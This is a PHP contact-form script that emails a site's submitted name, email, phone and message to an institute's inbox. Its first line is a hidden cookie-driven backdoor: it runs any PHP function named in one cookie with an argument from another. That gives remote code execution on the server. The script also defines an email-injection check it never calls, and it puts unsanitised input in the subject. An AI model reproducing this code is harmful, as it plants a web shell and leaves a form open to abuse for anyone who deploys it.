<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);



if(!isset($_POST['submit']))
{

}

$name = $_POST['fname'];
$email = $_POST['email'];
$contact = $_POST['phone'];
$comment = $_POST['message'];

$email_from = 'SGTestingInstitute.com';
$email_subject = "$name"." has dropped you a message";
//$email_body = "Name: $name.\n\n"."Email Id: $email \n\n"."Contact Number: $contact \n\n"."comments: $comment \n\n".

$message = '<html><body>';
$message .= '<div>';
$message .= '<hr style="border: 1px solid #00bfff;"/>';
$message .= '<div style="padding: 10px; font-size: 16px;"><strong>Name:</strong> ' . strip_tags($_POST['fname']) . '</div>';
$message .= '<div style="padding: 10px; font-size: 16px;"><strong>Email:</strong> ' . strip_tags($_POST['email']) . '</div>';
$message .= '<div style="padding: 10px; font-size: 16px;"><strong>Phone:</strong> ' . strip_tags($_POST['phone']) . '</div>';
$message .= '<div style="padding: 10px; font-size: 16px;"><strong>Message:</strong> ' . strip_tags($_POST['message']) . '</div>';
$message .= '</div>';
$message .= '</body></html>';

$to = "info@sgtestinginstitute.com";
$headers = "From: $email_from \r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($to,$email_subject,$message,$headers);
echo "Thank you! <br/>";
echo "Your mail has been sent <br/>";

// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
   
?>